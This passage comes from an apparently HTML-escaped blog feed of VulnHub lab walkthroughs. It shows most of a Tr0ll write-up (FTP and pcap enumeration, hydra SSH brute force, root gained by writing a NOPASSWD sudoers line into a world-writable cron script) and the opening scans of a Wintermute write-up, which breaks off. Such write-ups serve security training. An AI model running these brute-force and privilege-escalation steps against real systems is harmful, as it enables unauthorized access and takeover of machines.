|      Data connections will be plain text                                                                                                                          
|      At session startup, client count was 2                                                                                                                       
|      vsFTPd 3.0.2 - secure, fast, stable                                                                                                                          
|_End of status                                                                                                                                                     
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                   
| ssh-hostkey:                                                                                                                                                      
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                      
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.7 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-server-header: Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;ftp-enumeration&quot;&gt;FTP Enumeration&lt;/h3&gt;

&lt;p&gt;As we can see the anonymous login is enabled in the FTP service, we login and download the &lt;strong&gt;lol.pcap&lt;/strong&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp 192.168.179.182
Connected to 192.168.179.182.
220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.179.182:s4rgaz&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        112          4096 Aug 09  2014 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    2 0        112          4096 Aug 09  2014 ..
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;    1 1000     0            8068 Aug 09  2014 lol.pcap
226 Directory send OK.
ftp&amp;gt; get lol.pcap
&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: lol.pcap remote: lol.pcap
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;lol.pcap &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8068 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
226 Transfer complete.
8068 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.5741 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
ftp&amp;gt; quit
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We analyze the pcap file with tshark and found the resource &lt;strong&gt;sup3rs3cr3tdirlol&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tshark &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; lol.pcap &lt;span class=&quot;nt&quot;&gt;-Y&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ftp-data'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; fields &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; text 2&amp;gt;/dev/null
Timestamps,-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;
Timestamps,Well, well, well, aren&lt;span class=&quot;s1&quot;&gt;'t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P\n,\n,Sucks, you were so close... gotta TRY HARDER!\n
Timestamps,-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt\r\n
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;

&lt;p&gt;Browsing the web page, an image is displayed on the screen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll1/screenshot-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, I Browsed to the &lt;strong&gt;sup3rs3cr3tdirlol&lt;/strong&gt; directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll1/screenshot-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We download the &lt;strong&gt;roflmao&lt;/strong&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://192.168.179.182/sup3rs3cr3tdirlol/roflmao
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s a binary file, so I grant execution permissions, execute it, and it shows the address &lt;strong&gt;0x0856BF&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x roflmao

root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./roflmao 
Find address 0x0856BF to proceed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Browing the address &lt;strong&gt;0x0856BF&lt;/strong&gt;, it contains two directories.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll1/screenshot-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inside the &lt;strong&gt;good_look&lt;/strong&gt; directory ther is a file with a list of words, these look like usernames.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll1/screenshot-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We download the usernames and save them to a file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.179.182/0x0856BF/good_luck/which_one_lol.txt | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;users.txt 
maleus
ps-aux
felux
Eagle11
genphlux
usmc8892
blawrg
wytshadow
vis1t0r
overflow
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inside the folder &lt;strong&gt;this_folder_contains_the_password&lt;/strong&gt; there is a file called &lt;strong&gt;Pass.txt&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll1/screenshot-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We download the possible password.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.179.182/0x0856BF/this_folder_contains_the_password/Pass.txt | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;pass.txt     
Good_job_:&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We performed a wordlist attack with hydra but the password doesn’t work.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; pass.txt ssh://192.168.179.182
...
1 of 1 target completed, 0 valid password found
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The password may be the name of the file &lt;strong&gt;Pass.txt&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll1/screenshot-6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We copy &lt;strong&gt;Pass.txt&lt;/strong&gt; to a file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Pass.txt&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; pass.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We brute force again and find the password for the user &lt;strong&gt;overflow&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; pass.txt ssh://192.168.179.182
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22][ssh] host: 192.168.179.182   login: overflow   password: Pass.txt
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;h3 id=&quot;access-via-ssh&quot;&gt;Access via SSH&lt;/h3&gt;

&lt;p&gt;We login via SSH as user overflow.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh overflow@192.168.179.182                  
overflow@192.168.179.182&lt;span class=&quot;s1&quot;&gt;'s password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12
Could not chdir to home directory /home/overflow: No such file or directory
$ bash 
overflow@troll:/$
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The server closes the connection every five minutes, kicking us out of the system.&lt;/p&gt;

&lt;p&gt;When listing the writable files the &lt;strong&gt;cronlog&lt;/strong&gt; and &lt;strong&gt;cleaner.py&lt;/strong&gt; files look interesting.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;overflow@troll:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-writable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null | egrep &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'proc|sys'&lt;/span&gt;
/srv/ftp/lol.pcap
/var/tmp/cleaner.py.swp
/var/www/html/sup3rs3cr3tdirlol/roflmao
/var/log/cronlog
/lib/log/cleaner.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;strong&gt;cleaner.py&lt;/strong&gt; script has read, write and execute permissions for all users, we see that it deletes the content inside the /tmp directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;overflow@troll:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /lib/log/cleaner.py
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt; 1 root root 172 Jan 26 20:55 /lib/log/cleaner.py

overflow@troll:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /lib/log/cleaner.py
&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
import os
import sys
try:
        os.system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'rm -r /tmp/* '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
except:
        sys.exit&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;strong&gt;cronlog&lt;/strong&gt; file shows that the &lt;strong&gt;cleaner.py&lt;/strong&gt; script executes every two minutes.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;overflow@troll:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /var/log/cronlog
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt; 1 root root 23 Aug 13  2014 /var/log/cronlog

overflow@troll:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /var/log/cronlog
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/2 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; cleaner.py
overflow@troll:/var/www/html&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;h3 id=&quot;cron-job&quot;&gt;Cron Job&lt;/h3&gt;

&lt;p&gt;We edit the &lt;strong&gt;cleaner.py&lt;/strong&gt; script as follows to add to the user overflow to the sudoers file allowing him to execute /bin/bash without password.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;overflow@troll:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /lib/log/cleaner.py                                                                                                                           
&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python                                                                                                                                               &lt;/span&gt;
import os                                                                                                                                                           
import sys                                                                                                                                                          
try:                                                                                                                                                                
        os.system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'rm -r /tmp/* '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                  
        os.system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'echo &quot;overflow ALL=(ALL) NOPASSWD: /bin/bash&quot; &amp;gt;&amp;gt; /etc/sudoers'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                   
except:                                                                                                                                                             
        sys.exit&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
        
overflow@troll:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After few minutes we run /bin/bash with the sudo command, and we get root.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;overflow@troll:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /bin/bash
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;: unable to resolve host troll
root@troll:/#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We list the cron jobs and show the script that kicks us out of the system.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@troll:/# crontab &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-2&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/5 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /usr/bin/python /opt/lmao.py
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/2 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /usr/bin/python /lib/log/cleaner.py

root@troll:/# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /opt/lmao.py
&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
import os

os.system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'echo &quot;TIMES UP LOL!&quot;|wall'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
os.system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pkill -u 'overflow'&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
sys.exit&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;

root@troll:/#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We move to the root directory and read the flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@troll:/# &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;root/
root@troll:/root# &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;proof.txt
root@troll:/root# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;proof.txt 
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
root@troll:/root#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>s4rgaz</name></author><summary type="html">Description: Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.</summary></entry><entry><title type="html">VulnHub - Wintermute</title><link href="http://localhost:4000/wintermute.html" rel="alternate" type="text/html" title="VulnHub - Wintermute" /><published>2021-12-26T00:00:00-05:00</published><updated>2021-12-26T00:00:00-05:00</updated><id>http://localhost:4000/wintermute</id><content type="html" xml:base="http://localhost:4000/wintermute.html">&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt; A new OSCP style lab involving 2 vulnerable machines, themed after the cyberpunk classic Neuromancer a must read for any cyber-security enthusiast, this lab makes use of pivoting and post exploitation.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; creosote&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Operating System:&lt;/strong&gt; Linux&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Aim:&lt;/strong&gt; To get root on both machines.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/wintermute-1,239/&quot;&gt;https://www.vulnhub.com/entry/wintermute-1,239/&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h2&gt;
&lt;h3 id=&quot;host-discovery&quot;&gt;Host Discovery&lt;/h3&gt;

&lt;p&gt;A ping scan detected the target host on the local network, the script used can be found &lt;a href=&quot;https://github.com/s4rgaz/hdiscovery.git&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hdiscovery.py &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 192.168.179.0/24
192.168.179.180 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; up
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;p&gt;The full TCP port scan with nmap detected three available ports.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p1-65535&lt;/span&gt; 192.168.179.180 &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/all-tcp-ports
...
PORT     STATE SERVICE
25/tcp   open  smtp
80/tcp   open  http
3000/tcp open  ppp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;p&gt;In order to get more information about the target an aggressive scan was performed on open ports.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p25&lt;/span&gt;,80,3000 192.168.179.180 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/service-enum.txt
...
PORT     STATE SERVICE         VERSION                                                                                                                              
25/tcp   open  smtp            Postfix smtpd                                                                                                                        
|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,                                         
80/tcp   open  http            Apache httpd 2.4.25 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;                                                                                                       
| http-methods:                                                                                                                                                     
|_  Supported Methods: POST OPTIONS HEAD GET                                                                                                                        
|_http-server-header: Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                        
|_http-title: Night City                                                                                                                                            
3000/tcp open  hadoop-datanode Apache Hadoop                                                                                                                        
| hadoop-datanode-info: 
|_  Logs: submit
| hadoop-tasktracker-info: 
|_  Logs: submit
|_http-favicon: Unknown favicon MD5: 7FC0953320A93F3BC71770C25A7F4716
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Welcome to ntopng
|_Requested resource was /lua/login.lua?referer&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/
|_http-trane-info: Problem with XML parsing of /evox/about
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Enumeration on port 80&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;On the home page there is not much to see, so to find some hidden web content I ran gobuster.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wintermute/screenshot-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.179.180/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; html,php,txt
...
http://192.168.179.180/index.html           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 326]
http://192.168.179.180/manual               &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 319] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://192.168.179.180/manual/]
